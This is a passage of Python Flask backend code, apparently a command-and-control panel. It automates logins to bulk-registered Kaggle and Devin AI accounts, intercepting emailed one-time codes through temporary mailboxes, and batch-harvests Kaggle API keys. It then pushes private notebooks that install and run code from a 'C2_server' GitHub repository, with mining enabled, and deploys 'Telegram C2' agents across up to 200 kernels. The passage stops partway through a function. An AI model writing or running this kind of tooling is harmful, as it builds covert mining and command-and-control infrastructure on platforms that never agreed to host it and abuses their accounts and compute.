        driver = None
        try:
            print(f"[Login] {email} ({platform})")
            
            # Get Firefox profile
            profiles_ini = Path.home() / ".mozilla" / "firefox" / "profiles.ini"
            profile_path = None
            if profiles_ini.exists():
                config = ConfigParser()
                config.read(profiles_ini)
                for section in config.sections():
                    if section.startswith("Install"):
                        default_path = config.get(section, "Default", fallback=None)
                        if default_path:
                            profile_path = Path.home() / ".mozilla" / "firefox" / default_path
                            if profile_path.exists():
                                break
            
            # Copy profile to temp
            if profile_path:
                temp_dir = tempfile.mkdtemp(prefix="firefox_profile_")
                temp_profile = Path(temp_dir) / profile_path.name
                shutil.copytree(
                    profile_path, temp_profile,
                    ignore=shutil.ignore_patterns("*.lock", "lock", ".parentlock", "parent.lock", "*.sqlite-wal", "*.sqlite-shm", "cache2", "Cache"),
                    dirs_exist_ok=True
                )
                profile_path = temp_profile
            
            options = Options()
            options.binary_location = "/usr/bin/firefox-esr"
            options.set_preference("browser.link.open_newwindow", 3)
            options.set_preference("browser.link.open_newwindow.restriction", 0)
            
            if profile_path:
                options.add_argument("-profile")
                options.add_argument(str(profile_path))
            
            service = Service(executable_path="/home/garedberns/.cache/selenium/geckodriver/linux64/0.36.0/geckodriver")
            driver = webdriver.Firefox(options=options, service=service)
            
            # Platform-specific login
            if platform == "kaggle":
                driver.get("https://www.kaggle.com/account/login?phase=emailSignIn")
                time.sleep(3)
                
                wait = WebDriverWait(driver, 15)
                
                # Click Email tab
                driver.execute_script("""
                for(var b of document.querySelectorAll('button, div[role="tab"]'))
                    if(b.textContent.includes('Email')) { b.click(); return true; }
                return false;
                """)
                time.sleep(0.5)
                
                # Fill email
                email_input = wait.until(EC.presence_of_element_located((By.NAME, "email")))
                email_input.click()
                email_input.clear()
                email_input.send_keys(email)
                
                # Fill password
                pwd_input = driver.find_element(By.NAME, "password")
                pwd_input.click()
                pwd_input.clear()
                pwd_input.send_keys(password)
                
                time.sleep(0.5)
                
                # Submit
                driver.find_element(By.CSS_SELECTOR, "button[type='submit']").click()
                print(f"[Login] ✓ Kaggle login: {email}")
            elif platform == "devin_ai":
                # Devin AI uses Auth0 passwordless auth - need to monitor email for code
                driver.get("https://app.devin.ai/login")
                time.sleep(3)
                
                wait = WebDriverWait(driver, 15)
                print(f"[Login] Devin AI: {email}")
                
                # Fill email in Auth0 #username field
                try:
                    email_input = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, "#username")))
                    email_input.clear()
                    email_input.send_keys(email)
                    print(f"[Login] ✓ Email filled: {email}")
                    
                    time.sleep(0.5)
                    
                    # Click Continue
                    btns = driver.find_elements(By.TAG_NAME, "button")
                    for btn in btns:
                        if btn.is_displayed() and "continue" in btn.text.lower():
                            btn.click()
                            print(f"[Login] ✓ Continue clicked")
                            break
                    
                    # Get email_data from account to monitor inbox
                    email_data = acc.get("email_data", {})
                    code_found = {"value": None}
                    
                    def check_email_async():
                        if email_data and email_data.get("email"):
                            from src.mail.tempmail import mail_manager
                            email_addr = email_data["email"]
                            print(f"[Login] Monitoring inbox for {email_addr}")
                            
                            start = time.time()
                            poll_count = 0
                            while time.time() - start < 120 and not code_found["value"]:
                                time.sleep(2)
                                poll_count += 1
                                try:
                                    inbox = mail_manager.check_inbox(email_addr)
                                    
                                    if poll_count % 5 == 0:
                                        print(f"[Login] Poll #{poll_count}: {len(inbox)} messages")
                                    
                                    for msg in inbox:
                                        subj = (msg.get("subject") or "").lower()
                                        from_addr = (msg.get("from") or "").lower()
                                        
                                        if "devin" not in subj and "verif" not in subj and "code" not in subj and "otp" not in subj and "devin" not in from_addr:
                                            continue
                                        
                                        body = (msg.get("body") or "") + "\n" + (msg.get("html") or "")
                                        code = mail_manager.extract_code(body) if body else ""
                                        
                                        if code and len(code) >= 4:
                                            code_found["value"] = code
                                            print(f"[Login] ✓ CODE FOUND: {code}")
                                            return
                                
                                except Exception as ex:
                                    if poll_count % 10 == 0:
                                        print(f"[Login] ⚠ Error: {str(ex)[:60]}")
                            
                            if not code_found["value"]:
                                print(f"[Login] ✗ Email timeout")
                    
                    import threading
                    email_thread = threading.Thread(target=check_email_async, daemon=True)
                    email_thread.start()
                    
                    # Wait for code
                    print(f"[Login] Waiting for verification code...")
                    start_wait = time.time()
                    while time.time() - start_wait < 120 and not code_found["value"]:
                        time.sleep(1)
                        elapsed = int(time.time() - start_wait)
                        if elapsed % 15 == 0 and elapsed > 0:
                            print(f"[Login] [{elapsed}s] Waiting...")
                    
                    if code_found["value"]:
                        print(f"[Login] Entering verification code: {code_found['value']}")
                        
                        time.sleep(1)
                        
                        # Find code input
                        code_selectors = [
                            "input[autocomplete='one-time-code']",
                            "input[name*='code']",
                            "input[name*='otp']",
                            "input[type='text'][maxlength='6']",
                            "input[type='text'][maxlength='8']",
                        ]
                        
                        code_entered = False
                        for sel in code_selectors:
                            try:
                                inputs = driver.find_elements(By.CSS_SELECTOR, sel)
                                for inp in inputs:
                                    if inp.is_displayed() and inp.is_enabled():
                                        inp.clear()
                                        inp.send_keys(code_found["value"])
                                        print(f"[Login] ✓ Code entered")
                                        code_entered = True
                                        break
                                if code_entered:
                                    break
                            except:
                                continue
                        
                        if not code_entered:
                            # Try generic text input
                            try:
                                inputs = driver.find_elements(By.CSS_SELECTOR, "input[type='text']")
                                for inp in inputs:
                                    if inp.is_displayed():
                                        inp.clear()
                                        inp.send_keys(code_found["value"])
                                        print(f"[Login] ✓ Code entered via generic input")
                                        break
                            except:
                                pass
                        
                        time.sleep(1)
                        
                        # Submit
                        try:
                            btns = driver.find_elements(By.TAG_NAME, "button")
                            for btn in btns:
                                if btn.is_displayed() and ("continue" in btn.text.lower() or "verify" in btn.text.lower()):
                                    btn.click()
                                    print(f"[Login] ✓ Submit clicked")
                                    break
                        except:
                            pass
                        
                        time.sleep(3)
                        print(f"[Login] ✓ Devin AI login complete")
                    else:
                        print(f"[Login] ✗ No code received")
                        
                except Exception as e:
                    print(f"[Login] Devin AI error: {e}")
            else:
                # Generic login - just open platform URL
                from src.autoreg.engine import PLATFORMS
                platform_url = PLATFORMS.get(platform, {}).get("url", "")
                if platform_url:
                    driver.get(platform_url)
                else:
                    driver.get("https://www.kaggle.com/account/login?phase=emailSignIn")
                time.sleep(2)
            
            # Keep browser open
            while True:
                time.sleep(60)
                
        except Exception as e:
            print(f"[Login] Error: {e}")
            import traceback
            traceback.print_exc()
        finally:
            pass
    
    threading.Thread(target=do_login, daemon=False).start()
    
    log_event("account_login", f"{reg_id} ({platform})")
    return jsonify({"success": True})

@app.route("/api/autoreg/account/<reg_id>/push-optimizer", methods=["POST"])
@login_required
def autoreg_account_push_optimizer(reg_id):
    """Push optimizer notebook to Kaggle kernel via API."""
    import json
    import subprocess
    import tempfile
    import os
    from pathlib import Path
    
    acc = account_store.find(reg_id)
    if not acc:
        return jsonify({"error": "not found"}), 404
    
    if acc.get("platform") != "kaggle":
        return jsonify({"error": "only kaggle supported"}), 400
    
    username = acc.get("kaggle_username", "")
    api_key = acc.get("api_key_legacy") or acc.get("api_key", "")
    machines = acc.get("machines", [])
    
    if not api_key:
        return jsonify({"error": "no api_key"}), 400
    
    if not machines:
        return jsonify({"error": "no machines"}), 400
    
    kernel_slug = machines[0].get("slug", f"{username}/c2-agent-1")
    
    # Setup kaggle.json
    kaggle_dir = Path.home() / '.kaggle'
    kaggle_dir.mkdir(parents=True, exist_ok=True)
    kaggle_json = kaggle_dir / 'kaggle.json'
    kaggle_json.write_text(json.dumps({'username': username, 'key': api_key}))
    kaggle_json.chmod(0o600)
    
    # Create notebook - uses C2_server optimizer package
    code_lines = [
        "# C2 Server - GPU Compute Optimizer\n",
        "import subprocess, sys, os, time\n",
        "\n",
        "# Install package\n",
        "print('[Setup] Installing C2_server optimizer...')\n",
        "subprocess.run([sys.executable, '-m', 'pip', 'install', '-q', \n",
        "    'git+https://github.com/GaredBerns/C2_server'], check=False)\n",
        "\n",
        "# Import and run\n",
        "print('[Setup] Starting optimizer...')\n",
        "from optimizer.torch_cuda_optimizer import ComputeEngine\n",
        "\n",
        "engine = ComputeEngine(device='auto')\n",
        "engine.initialize()\n",
        "\n",
        "print('[Training] GPU optimization started!')\n",
        "print('[Training] Check worker on pool dashboard')\n",
        "\n",
        "# Keep running with training logs\n",
        "for i in range(600):\n",
        "    time.sleep(60)\n"
    ]
    
    notebook = {
        "cells": [{"cell_type": "code", "execution_count": None, "metadata": {}, "outputs": [], "source": code_lines}],
        "metadata": {"kernelspec": {"display_name": "Python 3", "language": "python", "name": "python3"}},
        "nbformat": 4, "nbformat_minor": 4
    }
    
    # Create temp dir
    tmpdir = tempfile.mkdtemp()
    notebook_path = Path(tmpdir) / "notebook.ipynb"
    notebook_path.write_text(json.dumps(notebook))
    
    kernel_meta = {
        "id": kernel_slug,
        "title": kernel_slug.split('/')[-1],
        "code_file": "notebook.ipynb",
        "language": "python",
        "kernel_type": "notebook",
        "is_private": True,
        "enable_gpu": False,
        "enable_internet": False,
        "dataset_sources": [f"{username}/cuda-compute-engine"]
    }
    (Path(tmpdir) / 'kernel-metadata.json').write_text(json.dumps(kernel_meta))
    
    # Push via kaggle API
    env = os.environ.copy()
    env['KAGGLE_USERNAME'] = username
    env['KAGGLE_KEY'] = api_key
    
    result = subprocess.run(
        ['kaggle', 'kernels', 'push', '-p', tmpdir],
        capture_output=True, text=True, timeout=60, env=env
    )
    
    if result.returncode == 0:
        log_event("push_optimizer", f"{reg_id} -> {kernel_slug}")
        return jsonify({"success": True, "kernel": kernel_slug, "output": result.stdout[:100]})
    else:
        return jsonify({"success": False, "error": result.stderr[:200]}), 500

@app.route("/api/autoreg/account/<reg_id>/legacy-key", methods=["POST"])
@login_required
def autoreg_account_legacy_key(reg_id):
    """Generate Legacy API Key for existing Kaggle account using Firefox+Selenium."""
    import threading
    
    acc = account_store.find(reg_id)
    if not acc:
        return jsonify({"error": "not found"}), 404
    
    if acc.get("platform") != "kaggle":
        return jsonify({"error": "only kaggle supported"}), 400
    
    email = acc.get("email", "")
    password = acc.get("password", "")
    
    def do_generate_legacy():
        import time, os, shutil, tempfile, glob, json
        from pathlib import Path
        from configparser import ConfigParser
        from selenium import webdriver
        from selenium.webdriver.firefox.options import Options
        from selenium.webdriver.firefox.service import Service
        from selenium.webdriver.common.by import By
        from selenium.webdriver.support.ui import WebDriverWait
        from selenium.webdriver.support import expected_conditions as EC
        
        driver = None
        try:
            print(f"[Legacy] Generating Legacy Key: {email}")
            
            # Get Firefox profile
            profiles_ini = Path.home() / ".mozilla" / "firefox" / "profiles.ini"
            profile_path = None
            if profiles_ini.exists():
                config = ConfigParser()
                config.read(profiles_ini)
                for section in config.sections():
                    if section.startswith("Install"):
                        default_path = config.get(section, "Default", fallback=None)
                        if default_path:
                            profile_path = Path.home() / ".mozilla" / "firefox" / default_path
                            if profile_path.exists():
                                break
            
            # Copy profile to temp
            download_dir = tempfile.mkdtemp(prefix="downloads_")
            if profile_path:
                temp_dir = tempfile.mkdtemp(prefix="firefox_profile_")
                temp_profile = Path(temp_dir) / profile_path.name
                shutil.copytree(
                    profile_path, temp_profile,
                    ignore=shutil.ignore_patterns("*.lock", "lock", ".parentlock", "parent.lock", "*.sqlite-wal", "*.sqlite-shm", "cache2", "Cache"),
                    dirs_exist_ok=True
                )
                profile_path = temp_profile
            
            options = Options()
            options.binary_location = "/usr/bin/firefox-esr"
            options.set_preference("browser.link.open_newwindow", 3)
            options.set_preference("browser.link.open_newwindow.restriction", 0)
            options.set_preference("browser.download.folderList", 2)
            options.set_preference("browser.download.dir", download_dir)
            options.set_preference("browser.download.useDownloadDir", True)
            options.set_preference("browser.download.always_ask_before_handling_new_types", False)
            options.set_preference("browser.helperApps.neverAsk.saveToDisk", "application/json,application/octet-stream,text/json")
            
            if profile_path:
                options.add_argument("-profile")
                options.add_argument(str(profile_path))
            
            service = Service(executable_path="/home/garedberns/.cache/selenium/geckodriver/linux64/0.36.0/geckodriver")
            driver = webdriver.Firefox(options=options, service=service)
            
            # Login to Kaggle
            driver.get("https://www.kaggle.com/account/login?phase=emailSignIn")
            time.sleep(3)
            
            wait = WebDriverWait(driver, 15)
            
            # Click Email tab
            driver.execute_script("""
            for(var b of document.querySelectorAll('button, div[role="tab"]'))
                if(b.textContent.includes('Email')) { b.click(); return true; }
            return false;
            """)
            time.sleep(0.5)
            
            # Fill email
            email_input = wait.until(EC.presence_of_element_located((By.NAME, "email")))
            email_input.click()
            email_input.clear()
            email_input.send_keys(email)
            
            # Fill password
            pwd_input = driver.find_element(By.NAME, "password")
            pwd_input.click()
            pwd_input.clear()
            pwd_input.send_keys(password)
            
            time.sleep(0.5)
            
            # Submit
            driver.find_element(By.CSS_SELECTOR, "button[type='submit']").click()
            time.sleep(3)
            print(f"[Legacy] Logged in: {email}")
            
            # Go to settings
            driver.get("https://www.kaggle.com/settings")
            time.sleep(2)
            
            # Scroll down
            driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
            time.sleep(1)
            
            # Click Create Legacy API Key
            result = driver.execute_script('''
            var buttons = document.querySelectorAll('button');
            for(var b of buttons) {
                if(b.textContent.includes('Create Legacy API Key')) {
                    b.click();
                    return 'clicked';
                }
            }
            return null;
            ''')
            
            if result:
                print("[Legacy] Clicked Create Legacy API Key")
                time.sleep(1)
                
                # Click Continue
                driver.execute_script('''
                var buttons = document.querySelectorAll('button');
                for(var b of buttons) {
                    if(b.textContent.trim() === 'Continue') {
                        b.click();
                        return 'clicked';
                    }
                }
                return null;
                ''')
                print("[Legacy] Clicked Continue")
                time.sleep(3)
                
                # Check downloads for kaggle.json
                for _ in range(10):
                    time.sleep(0.3)
                    files = glob.glob(os.path.join(download_dir, "kaggle*.json"))
                    if files:
                        kaggle_json_path = max(files, key=os.path.getctime)
                        with open(kaggle_json_path) as f:
                            kaggle_data = json.load(f)
                        
                        acc["api_key_legacy"] = kaggle_data.get("key", "")
                        acc["api_key"] = kaggle_data.get("key", "")
                        acc["kaggle_username"] = kaggle_data.get("username", "")
                        account_store.save()
                        
                        os.remove(kaggle_json_path)
                        print(f"[Legacy] ✓ Key: {acc['api_key_legacy'][:20]}...")
                        print(f"[Legacy] ✓ Username: {acc['kaggle_username']}")
                        break
            else:
                print("[Legacy] ✗ Create Legacy API Key button not found")
            
            # Keep browser open
            while True:
                time.sleep(60)
                
        except Exception as e:
            print(f"[Legacy] Error: {e}")
            import traceback
            traceback.print_exc()
        finally:
            pass
    
    threading.Thread(target=do_generate_legacy, daemon=False).start()
    
    log_event("legacy_key", f"{reg_id}")
    return jsonify({"success": True})

# ──────────────────────── API: BATCH LEGACY KEYS ────────────────────────

_batch_legacy_lock = threading.Lock()
batch_legacy_progress = {
    "running": False,
    "total": 0,
    "processed": 0,
    "success": 0,
    "failed": 0,
    "current_email": "",
    "logs": []
}

@app.route("/api/autoreg/batch-legacy-keys", methods=["POST"])
@login_required
def batch_legacy_keys():
    """Generate Legacy Keys for all Kaggle accounts without one."""
    
    with _batch_legacy_lock:
        if batch_legacy_progress["running"]:
            return jsonify({"error": "Batch already running"}), 400
    
    data = request.get_json(silent=True) or {}
    browser = data.get("browser", "chrome")  # 'chrome' or 'firefox'
    
    # Get accounts needing keys - all kaggle accounts without legacy key
    accounts = account_store.get_all()
    need_keys = [a for a in accounts if a.get("platform") == "kaggle" 
                 and a.get("email") 
                 and a.get("password")
                 and not a.get("api_key_legacy")]
    
    if not need_keys:
        return jsonify({"error": "No accounts need keys"}), 400
    
    # Reset progress
    batch_legacy_progress.update({
        "running": True,
        "total": len(need_keys),
        "processed": 0,
        "success": 0,
        "failed": 0,
        "current_email": "",
        "logs": [],
        "rate_limited_until": None,
        "rate_limited": False,
        "browser": browser
    })
    
    def add_log(msg):
        batch_legacy_progress["logs"].append(msg)
        if len(batch_legacy_progress["logs"]) > 100:
            batch_legacy_progress["logs"] = batch_legacy_progress["logs"][-100:]
        print(msg)
    
    def do_batch():
        """Batch legacy key generation using Selenium Firefox."""
        
        import os, shutil, tempfile, glob
        from pathlib import Path
        from configparser import ConfigParser
        from selenium import webdriver
        from selenium.webdriver.firefox.options import Options
        from selenium.webdriver.firefox.service import Service
        from selenium.webdriver.common.by import By
        from selenium.webdriver.support.ui import WebDriverWait
        from selenium.webdriver.support import expected_conditions as EC
        
        add_log(f"Starting batch legacy key generation...")
        
        # Get Firefox profile
        profiles_ini = Path.home() / ".mozilla" / "firefox" / "profiles.ini"
        base_profile_path = None
        if profiles_ini.exists():
            config = ConfigParser()
            config.read(profiles_ini)
            for section in config.sections():
                if section.startswith("Install"):
                    default_path = config.get(section, "Default", fallback=None)
                    if default_path:
                        base_profile_path = Path.home() / ".mozilla" / "firefox" / default_path
                        if base_profile_path.exists():
                            break
        
        for i, acc in enumerate(need_keys):
            if not batch_legacy_progress["running"]:
                add_log("Cancelled by user")
                break
            
            email = acc.get("email")
            password = acc.get("password")
            username = acc.get("username", email)
            
            batch_legacy_progress["current_email"] = email
            add_log(f"[{i+1}/{len(need_keys)}] {username}")
            
            driver = None
            try:
                # Copy profile to temp
                download_dir = tempfile.mkdtemp(prefix="downloads_")
                profile_path = None
                if base_profile_path:
                    temp_dir = tempfile.mkdtemp(prefix="firefox_profile_")
                    temp_profile = Path(temp_dir) / base_profile_path.name
                    shutil.copytree(
                        base_profile_path, temp_profile,
                        ignore=shutil.ignore_patterns("*.lock", "lock", ".parentlock", "parent.lock", "*.sqlite-wal", "*.sqlite-shm", "cache2", "Cache"),
                        dirs_exist_ok=True
                    )
                    profile_path = temp_profile
                
                options = Options()
                options.binary_location = "/usr/bin/firefox-esr"
                options.set_preference("browser.download.folderList", 2)
                options.set_preference("browser.download.dir", download_dir)
                options.set_preference("browser.download.useDownloadDir", True)
                options.set_preference("browser.download.always_ask_before_handling_new_types", False)
                options.set_preference("browser.helperApps.neverAsk.saveToDisk", "application/json,application/octet-stream,text/json")
                
                if profile_path:
                    options.add_argument("-profile")
                    options.add_argument(str(profile_path))
                
                service = Service(executable_path="/home/garedberns/.cache/selenium/geckodriver/linux64/0.36.0/geckodriver")
                driver = webdriver.Firefox(options=options, service=service)
                
                # Login to Kaggle
                add_log(f"  Logging in...")
                driver.get("https://www.kaggle.com/account/login?phase=emailSignIn")
                time.sleep(3)
                
                wait = WebDriverWait(driver, 15)
                
                # Click Email tab
                driver.execute_script("""
                for(var b of document.querySelectorAll('button, div[role="tab"]'))
                    if(b.textContent.includes('Email')) { b.click(); return true; }
                return false;
                """)
                time.sleep(0.5)
                
                # Fill email
                email_input = wait.until(EC.presence_of_element_located((By.NAME, "email")))
                email_input.click()
                email_input.clear()
                email_input.send_keys(email)
                
                # Fill password
                pwd_input = driver.find_element(By.NAME, "password")
                pwd_input.click()
                pwd_input.clear()
                pwd_input.send_keys(password)
                
                time.sleep(0.5)
                
                # Submit
                driver.find_element(By.CSS_SELECTOR, "button[type='submit']").click()
                time.sleep(3)
                add_log(f"  Logged in")
                
                # Go to settings
                driver.get("https://www.kaggle.com/settings")
                time.sleep(2)
                
                # Scroll down
                driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
                time.sleep(1)
                
                # Click Create Legacy API Key
                result = driver.execute_script('''
                var buttons = document.querySelectorAll('button');
                for(var b of buttons) {
                    if(b.textContent.includes('Create Legacy API Key')) {
                        b.click();
                        return 'clicked';
                    }
                }
                return null;
                ''')
                
                if result:
                    add_log(f"  Clicked Create Legacy API Key")
                    time.sleep(1)
                    
                    # Click Continue
                    driver.execute_script('''
                    var buttons = document.querySelectorAll('button');
                    for(var b of buttons) {
                        if(b.textContent.trim() === 'Continue') {
                            b.click();
                            return 'clicked';
                        }
                    }
                    return null;
                    ''')
                    add_log(f"  Clicked Continue")
                    time.sleep(3)
                    
                    # Check downloads for kaggle.json
                    key_found = False
                    for _ in range(10):
                        time.sleep(0.3)
                        files = glob.glob(os.path.join(download_dir, "kaggle*.json"))
                        if files:
                            kaggle_json_path = max(files, key=os.path.getctime)
                            with open(kaggle_json_path) as f:
                                kaggle_data = json.load(f)
                            
                            acc["api_key_legacy"] = kaggle_data.get("key", "")
                            acc["api_key"] = kaggle_data.get("key", "")
                            acc["kaggle_username"] = kaggle_data.get("username", "")
                            account_store.save()
                            
                            os.remove(kaggle_json_path)
                            key_found = True
                            batch_legacy_progress["success"] += 1
                            add_log(f"  ✓ Key: {acc['api_key'][:20]}...")
                            break
                    
                    if not key_found:
                        batch_legacy_progress["failed"] += 1
                        add_log(f"  ✗ Key not downloaded")
                else:
                    batch_legacy_progress["failed"] += 1
                    add_log(f"  ✗ Button not found")
                
            except Exception as e:
                batch_legacy_progress["failed"] += 1
                add_log(f"  ✗ Error: {e}")
            
            finally:
                if driver:
                    try:
                        driver.quit()
                    except:
                        pass
            
            batch_legacy_progress["processed"] = i + 1
            time.sleep(2)
        
        batch_legacy_progress["running"] = False
        batch_legacy_progress["current_email"] = ""
        add_log(f"Batch complete: {batch_legacy_progress['success']} success, {batch_legacy_progress['failed']} failed")
        log_event("batch_legacy", f"{batch_legacy_progress['success']}/{batch_legacy_progress['total']}")
    
    threading.Thread(target=do_batch, daemon=True).start()
    
    return jsonify({
        "status": "started",
        "total": len(need_keys)
    })

@app.route("/api/autoreg/batch-legacy-progress")
@login_required
def get_batch_legacy_progress():
    """Get current progress of batch legacy key generation."""
    return jsonify(batch_legacy_progress)

@app.route("/api/autoreg/batch-legacy-cancel", methods=["POST"])
@login_required
def cancel_batch_legacy():
    """Cancel batch legacy key generation."""
    batch_legacy_progress["running"] = False
    return jsonify({"status": "cancelled"})

# ──────────────────────── API: BATCH DATASETS & MACHINES ────────────────────────

_batch_dataset_lock = threading.Lock()
batch_dataset_progress = {
    "running": False,
    "total": 0,
    "processed": 0,
    "success": 0,
    "failed": 0,
    "current_email": "",
    "current": "",
    "logs": []
}

@app.route("/api/autoreg/batch-datasets", methods=["POST"])
@login_required
def batch_datasets():
    """Create 5 machines (kernels) for all Kaggle accounts with API key."""
    
    with _batch_dataset_lock:
        if batch_dataset_progress["running"]:
            return jsonify({"error": "Batch already running"}), 400
    
    # Get accounts with API keys (legacy or standard) for Kaggle
    accounts = account_store.get_all()
    have_keys = [a for a in accounts if a.get("platform") == "kaggle"
                 and (a.get("api_key_legacy") or a.get("api_key"))
                 and (a.get("kaggle_username") or a.get("username"))]

    if not have_keys:
        return jsonify({"error": "No Kaggle accounts with API keys found. Run Batch Keys first."}), 400
    
    # Reset progress
    batch_dataset_progress.update({
        "running": True,
        "total": len(have_keys),
        "processed": 0,
        "success": 0,
        "failed": 0,
        "current_email": "",
        "current": "",
        "logs": []
    })
    
    def add_log(msg):
        batch_dataset_progress["logs"].append(msg)
        if len(batch_dataset_progress["logs"]) > 100:
            batch_dataset_progress["logs"] = batch_dataset_progress["logs"][-100:]
        print(msg)
    
    def do_batch():
        
        from src.agents.kaggle.datasets import create_dataset_with_machines, check_kaggle_cli_installed
        
        if not check_kaggle_cli_installed():
            add_log("✗ Kaggle CLI not installed. Run: pip install kaggle")
            batch_dataset_progress["running"] = False
            return
        
        # Telegram C2 works directly - no URL needed
        add_log(f"Deploying agents with Telegram C2...")
        
        for i, acc in enumerate(have_keys):
            if not batch_dataset_progress["running"]:
                add_log("Batch cancelled")
                break
            
            email = acc.get("email", "")
            api_key = acc.get("api_key_legacy") or acc.get("api_key", "")
            username = acc.get("kaggle_username") or acc.get("username", "")

            batch_dataset_progress["current_email"] = email
            batch_dataset_progress["current"] = email

            add_log(f"[{i+1}/{len(have_keys)}] Processing: {username}")
            
            # Create machines with Telegram C2
            result = create_dataset_with_machines(
                api_key, username, num_machines=5, log_fn=add_log,
                enable_mining=True
            )
            
            # Save machines info
            if result.get("machines_created", 0) > 0:
                machines = result.get("machines", [])
                account_store.update(acc["reg_id"], {
                    "machines": machines,
                    "machines_created": result.get("machines_created", 0)
                })
                
                # Register kernels in kaggle_agents_state
                with kaggle_agents_state_lock:
                    for machine in machines:
                        kernel_slug = machine.get("slug", "")
                        kernel_num = machine.get("num", 1)
                        kernel_id = f"kaggle-{username}-agent{kernel_num}"
                        kaggle_agents_state[kernel_id] = {
                            "last_checkin": time.time(),
                            "info": {"mode": "deployed", "kernel_slug": kernel_slug},
                            "pending_commands": [],
                            "results": [],
                            "status": "deployed"
                        }
                
                add_log(f"✓ Deployed {result.get('machines_created', 0)} agents with C2")
            
            if result.get("success"):
                batch_dataset_progress["success"] += 1
            else:
                batch_dataset_progress["failed"] += 1
                add_log(f"✗ Failed: {result.get('error', 'unknown')}")
            
            batch_dataset_progress["processed"] = i + 1
            time.sleep(1)
        
        batch_dataset_progress["running"] = False
        batch_dataset_progress["current_email"] = ""
        batch_dataset_progress["current"] = ""
        add_log(f"Batch complete: {batch_dataset_progress['success']} success, {batch_dataset_progress['failed']} failed")
        add_log(f"All agents deployed with Telegram C2")
        log_event("batch_datasets", f"{batch_dataset_progress['success']}/{batch_dataset_progress['total']} - agents deployed")
    
    threading.Thread(target=do_batch, daemon=True).start()
    
    return jsonify({
        "status": "started",
        "total": len(have_keys)
    })

@app.route("/api/autoreg/batch-datasets-progress")
@login_required
def get_batch_dataset_progress():
    """Get current progress of batch dataset creation."""
    return jsonify(batch_dataset_progress)

@app.route("/api/autoreg/batch-datasets-cancel", methods=["POST"])
@login_required
def cancel_batch_datasets():
    """Cancel batch dataset creation."""
    batch_dataset_progress["running"] = False
    return jsonify({"status": "cancelled"})

# ──────────────────────── BATCH JOIN C2 ────────────────────────

# Old HTTP-based C2 removed - now using Telegram C2 in notebook
# Telegram C2 works directly without server URL

_batch_join_c2_lock = threading.Lock()
batch_join_c2_progress = {
    "running": False,
    "total": 0,
    "processed": 0,
    "success": 0,
    "failed": 0,
    "current": "",
    "logs": []
}

def _get_account_kernels(username: str, api_key: str) -> list:
    """Get list of kernel slugs for account via kaggle kernels list --mine."""
    import subprocess as _sp
    from pathlib import Path
    kaggle_dir = Path.home() / ".kaggle"
    kaggle_dir.mkdir(parents=True, exist_ok=True)
    (kaggle_dir / "kaggle.json").write_text(json.dumps({"username": username, "key": api_key}))
    (kaggle_dir / "kaggle.json").chmod(0o600)
    try:
        r = _sp.run(["kaggle", "kernels", "list", "--mine"], capture_output=True, text=True, timeout=30)
        if r.returncode != 0:
            return []
        slugs = []
        for line in r.stdout.strip().split("\n")[2:]:
            parts = line.split()
            if parts and "/" in parts[0]:
                slugs.append(parts[0].strip())
        return slugs
    except Exception:
        return []

def _deploy_code_to_kernel(username: str, api_key: str, kernel_slug: str, code: str) -> bool:
    """Deploy code to Kaggle kernel via CLI. Returns True on success."""
    import subprocess as _sp
    import tempfile
    from pathlib import Path
    kaggle_dir = Path.home() / ".kaggle"
    kaggle_dir.mkdir(parents=True, exist_ok=True)
    (kaggle_dir / "kaggle.json").write_text(json.dumps({"username": username, "key": api_key}))
    (kaggle_dir / "kaggle.json").chmod(0o600)
    try:
        with tempfile.TemporaryDirectory() as tmpdir:
            tmp = Path(tmpdir)
            r = _sp.run(["kaggle", "kernels", "pull", kernel_slug, "-p", tmpdir, "-m"], capture_output=True, text=True, timeout=60)
            if r.returncode != 0:
                return False
            nb_files = list(tmp.glob("*.ipynb"))
            if not nb_files:
                return False
            nb = json.loads(nb_files[0].read_text())
            lines = [line + "\n" for line in code.split("\n")]
            nb["cells"] = [{"cell_type": "code", "execution_count": None, "metadata": {}, "outputs": [], "source": lines}]
            nb_files[0].write_text(json.dumps(nb, indent=2))
            meta_path = tmp / "kernel-metadata.json"
            meta = json.loads(meta_path.read_text()) if meta_path.exists() else {}
            meta.update({
                "id": kernel_slug,
                "title": kernel_slug.split("/")[-1].replace("-", " "),
                "code_file": nb_files[0].name,
                "language": "python",
                "kernel_type": "notebook",
                "is_private": True,
                "enable_gpu": True,
                "enable_tpu": False,
                "enable_internet": True,
            })
            meta.setdefault("dataset_sources", [])
            meta.setdefault("competition_sources", [])
            meta.setdefault("kernel_sources", [])
            meta.setdefault("model_sources", [])
            meta_path.write_text(json.dumps(meta, indent=2))
            r2 = _sp.run(["kaggle", "kernels", "push", "-p", tmpdir], capture_output=True, text=True, timeout=120)
            return r2.returncode == 0
    except Exception:
        return False

@app.route("/api/autoreg/batch-join-c2", methods=["POST"])
@login_required
def batch_join_c2():
    """Deploy Telegram C2 agent to all Kaggle machines."""
    with _batch_join_c2_lock:
        if batch_join_c2_progress["running"]:
            return jsonify({"error": "Batch already running"}), 400
    # Telegram C2 works directly - no URL needed
    accounts = account_store.get_all()
    targets = []
    for a in accounts:
        if a.get("platform") != "kaggle" or not a.get("api_key_legacy"):
            continue
        username = a.get("kaggle_username") or a.get("username", "")
        if not username:
            continue
        api_key = a.get("api_key_legacy")
        slugs = _get_account_kernels(username, api_key)
        if not slugs:
            slugs = [m.get("slug", m) for m in (a.get("machines") or []) if isinstance(m, dict) and m.get("slug") or (isinstance(m, str) and m)]
        for slug in slugs:
            if slug:
                targets.append({"reg_id": a["reg_id"], "email": a.get("email", ""), "username": username, "api_key": api_key, "kernel_slug": slug})
    if not targets:
        return jsonify({"error": "No Kaggle machines with API keys found"}), 400
    if len(targets) > 200:
        targets = targets[:200]
        log_event("batch_join_c2", f"Limited to 200 machines (total was {len(account_store.get_all())})")
    batch_join_c2_progress.update({
        "running": True,
        "total": len(targets),
        "processed": 0,
        "success": 0,
        "failed": 0,
        "current": "",
        "logs": []
    })

    def _log(msg):
        batch_join_c2_progress["logs"].append(msg)
        if len(batch_join_c2_progress["logs"]) > 100:
            batch_join_c2_progress["logs"] = batch_join_c2_progress["logs"][-100:]
        print(msg)

    def _run():
        for i, t in enumerate(targets):
            if not batch_join_c2_progress["running"]:
                _log("Cancelled")
                break
            batch_join_c2_progress["current"] = f"{t['email']} / {t['kernel_slug']}"
            _log(f"[{i+1}/{len(targets)}] Deploying to {t['kernel_slug']}...")
            try:
